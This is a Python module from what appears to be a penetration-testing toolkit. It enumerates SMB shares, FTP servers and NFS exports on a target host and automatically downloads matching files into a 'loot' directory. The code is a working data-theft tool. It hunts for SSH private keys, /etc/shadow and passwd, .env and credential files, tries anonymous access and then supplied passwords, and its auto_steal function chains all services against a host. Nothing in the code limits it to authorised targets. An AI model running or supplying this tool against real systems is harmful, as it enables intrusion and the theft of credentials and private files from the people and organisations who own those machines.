"""File exfiltration from vulnerable network shares (SMB, FTP, NFS)."""

import asyncio
import logging
import re
from datetime import datetime
from pathlib import Path

logger = logging.getLogger("penstation.file_stealer")

LOOT_DIR = Path("/home/kali/penstation/loot/files")
LOOT_DIR.mkdir(parents=True, exist_ok=True)

# File patterns to steal (most interesting first)
DEFAULT_PATTERNS = [
    "*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx",
    "*.pdf", "*.csv", "*.conf", "*.config", "*.cfg",
    "*.ini", "*.env", "*.key", "*.pem", "*.crt",
    "*.json", "*.xml", "*.yaml", "*.yml",
    "*.sql", "*.bak", "*.log",
    "*.sh", "*.bat", "*.ps1",
    "id_rsa", "id_ed25519", "authorized_keys",
    "shadow", "passwd", "credentials*",
]

# Max file size to steal (10MB)
MAX_FILE_SIZE = 10 * 1024 * 1024

# Track running jobs
_running_jobs: dict[str, asyncio.subprocess.Process] = {}


# ── SMB Share Enumeration ──────────────────────────────────

async def scan_smb_shares(
    host_ip: str,
    username: str = "",
    password: str = "",
) -> dict:
    """
    Enumerate SMB shares on a host.

    Args:
        host_ip: Target host IP
        username: Username for auth (empty = anonymous/guest)
        password: Password for auth

    Returns:
        Dict with list of shares and access info
    """
    # Build smbclient command
    cmd = ["smbclient", "-L", host_ip, "--no-pass"]
    if username:
        cmd = ["smbclient", "-L", host_ip, "-U", f"{username}%{password}"]

    try:
        logger.info(f"Scanning SMB shares on {host_ip}")
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        output = stdout.decode() + stderr.decode()

        shares = []
        # Parse smbclient output:
        # Sharename       Type      Comment
        # ---------       ----      -------
        # ADMIN$          Disk      Remote Admin
        in_shares = False
        for line in output.split("\n"):
            if "Sharename" in line:
                in_shares = True
                continue
            if in_shares and "---" in line:
                continue
            if in_shares and line.strip():
                parts = line.strip().split()
                if len(parts) >= 2:
                    name = parts[0]
                    share_type = parts[1]
                    comment = " ".join(parts[2:]) if len(parts) > 2 else ""
                    if share_type == "Disk":
                        shares.append({
                            "name": name,
                            "type": share_type,
                            "comment": comment,
                        })
                else:
                    in_shares = False

        # Test access to each share
        for share in shares:
            share["accessible"] = await _test_smb_access(
                host_ip, share["name"], username, password
            )

        return {
            "success": True,
            "host_ip": host_ip,
            "shares": shares,
            "auth": "anonymous" if not username else username,
        }

    except asyncio.TimeoutError:
        return {"success": False, "error": "SMB scan timed out"}
    except FileNotFoundError:
        return {"success": False, "error": "smbclient not installed. Run: sudo apt install smbclient"}
    except Exception as e:
        logger.error(f"SMB scan error: {e}")
        return {"success": False, "error": str(e)}


async def _test_smb_access(
    host_ip: str, share: str, username: str = "", password: str = ""
) -> bool:
    """Test if we can access an SMB share."""
    cmd = ["smbclient", f"//{host_ip}/{share}", "--no-pass", "-c", "dir"]
    if username:
        cmd = ["smbclient", f"//{host_ip}/{share}", "-U", f"{username}%{password}", "-c", "dir"]

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        await asyncio.wait_for(proc.communicate(), timeout=10)
        return proc.returncode == 0
    except Exception:
        return False


async def steal_smb_files(
    host_ip: str,
    share: str,
    username: str = "",
    password: str = "",
    patterns: list[str] | None = None,
    max_depth: int = 3,
) -> dict:
    """
    Download files from an SMB share.

    Args:
        host_ip: Target host IP
        share: Share name
        username: Username (empty = anonymous)
        password: Password
        patterns: File patterns to look for
        max_depth: Max directory depth to traverse

    Returns:
        Dict with stolen file list
    """
    if patterns is None:
        patterns = DEFAULT_PATTERNS

    output_dir = LOOT_DIR / host_ip / "smb" / share
    output_dir.mkdir(parents=True, exist_ok=True)
    job_id = f"steal_smb_{host_ip}_{share}"

    stolen_files = []

    try:
        # First list files recursively
        logger.info(f"Listing SMB files: //{host_ip}/{share}")
        file_list = await _list_smb_recursive(
            host_ip, share, username, password, max_depth
        )

        if not file_list:
            return {
                "success": False,
                "host_ip": host_ip,
                "share": share,
                "message": "No files found or access denied",
                "files": [],
            }

        # Filter by patterns
        matched = _filter_files(file_list, patterns)
        logger.info(f"Found {len(matched)} matching files out of {len(file_list)} total")

        # Download each matching file
        for remote_path, file_size in matched:
            if file_size > MAX_FILE_SIZE:
                logger.info(f"Skipping {remote_path} (too large: {file_size})")
                continue

            local_path = output_dir / remote_path.lstrip("/\\")
            local_path.parent.mkdir(parents=True, exist_ok=True)

            success = await _download_smb_file(
                host_ip, share, remote_path, str(local_path),
                username, password,
            )

            if success and local_path.exists():
                stolen_files.append({
                    "remote_path": remote_path,
                    "local_path": str(local_path),
                    "size": local_path.stat().st_size,
                    "service": "smb",
                })

        return {
            "success": len(stolen_files) > 0,
            "host_ip": host_ip,
            "share": share,
            "total_files_found": len(file_list),
            "matched_patterns": len(matched),
            "files_stolen": len(stolen_files),
            "files": stolen_files,
        }

    except Exception as e:
        logger.error(f"SMB steal error: {e}")
        return {"success": False, "error": str(e)}


async def _list_smb_recursive(
    host_ip: str, share: str, username: str, password: str,
    max_depth: int, path: str = "", depth: int = 0,
) -> list[tuple[str, int]]:
    """Recursively list files on SMB share. Returns list of (path, size)."""
    if depth > max_depth:
        return []

    cmd = ["smbclient", f"//{host_ip}/{share}", "--no-pass"]
    if username:
        cmd = ["smbclient", f"//{host_ip}/{share}", "-U", f"{username}%{password}"]
    cmd.extend(["-c", f"cd {path}; ls" if path else "-c", "ls"] if not path else ["-c", f'cd "{path}"; ls'])

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
        output = stdout.decode()

        files = []
        dirs = []
        for line in output.split("\n"):
            # Parse smbclient ls output:
            #   .                    D  0  Thu Jan 01 00:00:00 2025
            #   file.txt             N  1234  Thu Jan 01 00:00:00 2025
            match = re.match(
                r"\s{2}(.+?)\s{2,}([DNARHS]+)\s+(\d+)\s+\w{3}\s",
                line,
            )
            if match:
                name = match.group(1).strip()
                attrs = match.group(2)
                size = int(match.group(3))

                if name in (".", ".."):
                    continue

                full_path = f"{path}/{name}" if path else name

                if "D" in attrs:
                    dirs.append(full_path)
                else:
                    files.append((full_path, size))

        # Recurse into directories
        for d in dirs:
            sub_files = await _list_smb_recursive(
                host_ip, share, username, password, max_depth, d, depth + 1
            )
            files.extend(sub_files)

        return files

    except Exception as e:
        logger.warning(f"SMB list error at {path}: {e}")
        return []


async def _download_smb_file(
    host_ip: str, share: str, remote_path: str, local_path: str,
    username: str = "", password: str = "",
) -> bool:
    """Download a single file from SMB share."""
    cmd = ["smbclient", f"//{host_ip}/{share}", "--no-pass"]
    if username:
        cmd = ["smbclient", f"//{host_ip}/{share}", "-U", f"{username}%{password}"]
    cmd.extend(["-c", f'get "{remote_path}" "{local_path}"'])

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        await asyncio.wait_for(proc.communicate(), timeout=30)
        return proc.returncode == 0
    except Exception as e:
        logger.warning(f"SMB download error: {remote_path}: {e}")
        return False


# ── FTP Enumeration & Stealing ────────────────────────────

async def scan_ftp(
    host_ip: str,
    port: int = 21,
    username: str = "anonymous",
    password: str = "anonymous@",
) -> dict:
    """
    Check FTP access and list files.

    Args:
        host_ip: Target host IP
        port: FTP port
        username: Username (default: anonymous)
        password: Password

    Returns:
        Dict with FTP access info and file list
    """
    try:
        logger.info(f"Scanning FTP on {host_ip}:{port} as {username}")

        # Use curl for FTP listing (more reliable than lftp)
        cmd = [
            "curl", "-s", "--max-time", "15",
            "-u", f"{username}:{password}",
            f"ftp://{host_ip}:{port}/",
        ]

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=20)

        if proc.returncode != 0:
            return {
                "success": False,
                "host_ip": host_ip,
                "error": "FTP connection failed or access denied",
            }

        output = stdout.decode()
        files = _parse_ftp_listing(output)

        return {
            "success": True,
            "host_ip": host_ip,
            "port": port,
            "auth": username,
            "files": files,
        }

    except Exception as e:
        logger.error(f"FTP scan error: {e}")
        return {"success": False, "error": str(e)}


def _parse_ftp_listing(output: str) -> list[dict]:
    """Parse FTP directory listing."""
    files = []
    for line in output.strip().split("\n"):
        if not line.strip():
            continue
        # Try Unix ls-style: drwxr-xr-x  2 user group 4096 Jan 01 00:00 dirname
        match = re.match(
            r"([d-])([rwxsStT-]{9})\s+\d+\s+\S+\s+\S+\s+(\d+)\s+\w+\s+\d+\s+[\d:]+\s+(.+)",
            line,
        )
        if match:
            is_dir = match.group(1) == "d"
            size = int(match.group(3))
            name = match.group(4).strip()
            files.append({
                "name": name,
                "size": size,
                "is_dir": is_dir,
            })
        else:
            # Simple filename listing
            name = line.strip()
            if name:
                files.append({"name": name, "size": 0, "is_dir": False})
    return files


async def steal_ftp_files(
    host_ip: str,
    port: int = 21,
    username: str = "anonymous",
    password: str = "anonymous@",
    patterns: list[str] | None = None,
    remote_dir: str = "/",
) -> dict:
    """
    Download files from FTP server.

    Args:
        host_ip: Target host IP
        port: FTP port
        username: FTP username
        password: FTP password
        patterns: File patterns to steal
        remote_dir: Remote directory to start from

    Returns:
        Dict with stolen file list
    """
    if patterns is None:
        patterns = DEFAULT_PATTERNS

    output_dir = LOOT_DIR / host_ip / "ftp"
    output_dir.mkdir(parents=True, exist_ok=True)

    stolen_files = []

    try:
        # Get file listing
        result = await scan_ftp(host_ip, port, username, password)
        if not result.get("success"):
            return {"success": False, "error": "Cannot access FTP", "files": []}

        file_list = result.get("files", [])
        matched = [
            f for f in file_list
            if not f["is_dir"] and _matches_patterns(f["name"], patterns)
        ]

        for f in matched:
            if f.get("size", 0) > MAX_FILE_SIZE:
                continue

            remote_path = f"{remote_dir.rstrip('/')}/{f['name']}"
            local_path = output_dir / f["name"]

            cmd = [
                "curl", "-s", "--max-time", "30",
                "-u", f"{username}:{password}",
                "-o", str(local_path),
                f"ftp://{host_ip}:{port}{remote_path}",
            ]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            await asyncio.wait_for(proc.communicate(), timeout=35)

            if proc.returncode == 0 and local_path.exists():
                stolen_files.append({
                    "remote_path": remote_path,
                    "local_path": str(local_path),
                    "size": local_path.stat().st_size,
                    "service": "ftp",
                })

        return {
            "success": len(stolen_files) > 0,
            "host_ip": host_ip,
            "total_files": len(file_list),
            "matched": len(matched),
            "files_stolen": len(stolen_files),
            "files": stolen_files,
        }

    except Exception as e:
        logger.error(f"FTP steal error: {e}")
        return {"success": False, "error": str(e)}


# ── NFS Export Scanning ───────────────────────────────────

async def scan_nfs_exports(host_ip: str) -> dict:
    """
    Scan for NFS exports on a host.

    Returns:
        Dict with NFS exports list
    """
    try:
        logger.info(f"Scanning NFS exports on {host_ip}")

        proc = await asyncio.create_subprocess_exec(
            "showmount", "-e", host_ip,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15)

        if proc.returncode != 0:
            return {
                "success": False,
                "host_ip": host_ip,
                "error": "No NFS exports or host unreachable",
            }

        exports = []
        output = stdout.decode()
        for line in output.split("\n")[1:]:  # Skip header
            parts = line.strip().split()
            if len(parts) >= 2:
                exports.append({
                    "path": parts[0],
                    "allowed": " ".join(parts[1:]),
                })

        return {
            "success": True,
            "host_ip": host_ip,
            "exports": exports,
        }

    except FileNotFoundError:
        return {"success": False, "error": "showmount not installed. Run: sudo apt install nfs-common"}
    except Exception as e:
        logger.error(f"NFS scan error: {e}")
        return {"success": False, "error": str(e)}


async def steal_nfs_files(
    host_ip: str,
    export_path: str,
    patterns: list[str] | None = None,
) -> dict:
    """
    Mount NFS export and steal files.

    Args:
        host_ip: Target host IP
        export_path: NFS export path
        patterns: File patterns to steal

    Returns:
        Dict with stolen file list
    """
    if patterns is None:
        patterns = DEFAULT_PATTERNS

    mount_point = Path(f"/tmp/penstation_nfs_{host_ip.replace('.', '_')}")
    output_dir = LOOT_DIR / host_ip / "nfs"
    output_dir.mkdir(parents=True, exist_ok=True)

    stolen_files = []

    try:
        # Create mount point
        mount_point.mkdir(parents=True, exist_ok=True)

        # Mount NFS export
        logger.info(f"Mounting NFS: {host_ip}:{export_path}")
        proc = await asyncio.create_subprocess_exec(
            "mount", "-t", "nfs", "-o", "ro,noexec",
            f"{host_ip}:{export_path}", str(mount_point),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=15)

        if proc.returncode != 0:
            return {
                "success": False,
                "host_ip": host_ip,
                "error": f"Mount failed: {stderr.decode()}",
            }

        # Find matching files
        for pattern in patterns:
            for f in mount_point.rglob(pattern):
                if f.is_file() and f.stat().st_size <= MAX_FILE_SIZE:
                    rel_path = f.relative_to(mount_point)
                    local_path = output_dir / rel_path
                    local_path.parent.mkdir(parents=True, exist_ok=True)

                    try:
                        # Copy file
                        import shutil
                        shutil.copy2(str(f), str(local_path))
                        stolen_files.append({
                            "remote_path": str(rel_path),
                            "local_path": str(local_path),
                            "size": local_path.stat().st_size,
                            "service": "nfs",
                        })
                    except Exception as e:
                        logger.warning(f"Copy failed: {f}: {e}")

        return {
            "success": len(stolen_files) > 0,
            "host_ip": host_ip,
            "export": export_path,
            "files_stolen": len(stolen_files),
            "files": stolen_files,
        }

    except Exception as e:
        logger.error(f"NFS steal error: {e}")
        return {"success": False, "error": str(e)}
    finally:
        # Always unmount
        try:
            await asyncio.create_subprocess_exec(
                "umount", str(mount_point),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
        except Exception:
            pass


# ── Utility Functions ─────────────────────────────────────

def _matches_patterns(filename: str, patterns: list[str]) -> bool:
    """Check if filename matches any of the patterns."""
    import fnmatch
    name_lower = filename.lower()
    for pat in patterns:
        if fnmatch.fnmatch(name_lower, pat.lower()):
            return True
    return False


def _filter_files(
    file_list: list[tuple[str, int]], patterns: list[str]
) -> list[tuple[str, int]]:
    """Filter file list by patterns."""
    return [
        (path, size) for path, size in file_list
        if _matches_patterns(Path(path).name, patterns)
    ]


async def auto_steal(host_ip: str, credentials: list[dict] | None = None) -> dict:
    """
    Automatically scan and steal from all available services on a host.

    Args:
        host_ip: Target host IP
        credentials: List of credentials dicts with username/password

    Returns:
        Dict with all stolen files across services
    """
    all_files = []
    creds = credentials or [{"username": "", "password": ""}]

    # Try SMB
    for cred in creds:
        smb_result = await scan_smb_shares(
            host_ip, cred.get("username", ""), cred.get("password", "")
        )
        if smb_result.get("success"):
            for share in smb_result.get("shares", []):
                if share.get("accessible"):
                    steal_result = await steal_smb_files(
                        host_ip, share["name"],
                        cred.get("username", ""), cred.get("password", ""),
                    )
                    all_files.extend(steal_result.get("files", []))

    # Try FTP (anonymous)
    ftp_result = await steal_ftp_files(host_ip)
    all_files.extend(ftp_result.get("files", []))

    # Try FTP with credentials
    for cred in creds:
        if cred.get("username"):
            ftp_result = await steal_ftp_files(
                host_ip, username=cred["username"], password=cred.get("password", ""),
            )
            all_files.extend(ftp_result.get("files", []))

    # Try NFS
    nfs_result = await scan_nfs_exports(host_ip)
    if nfs_result.get("success"):
        for export in nfs_result.get("exports", []):
            nfs_steal = await steal_nfs_files(host_ip, export["path"])
            all_files.extend(nfs_steal.get("files", []))

    return {
        "success": len(all_files) > 0,
        "host_ip": host_ip,
        "total_stolen": len(all_files),
        "files": all_files,
    }


def get_all_loot() -> list[dict]:
    """List all stolen files from the loot directory."""
    loot = []
    for f in sorted(LOOT_DIR.rglob("*"), reverse=True):
        if f.is_file():
            rel = f.relative_to(LOOT_DIR)
            parts = str(rel).split("/") if "/" in str(rel) else str(rel).split("\\")
            host_ip = parts[0] if parts else "unknown"
            loot.append({
                "host_ip": host_ip,
                "path": str(f),
                "relative": str(rel),
                "size": f.stat().st_size,
                "stolen_at": datetime.fromtimestamp(f.stat().st_ctime).isoformat(),
            })
    return loot
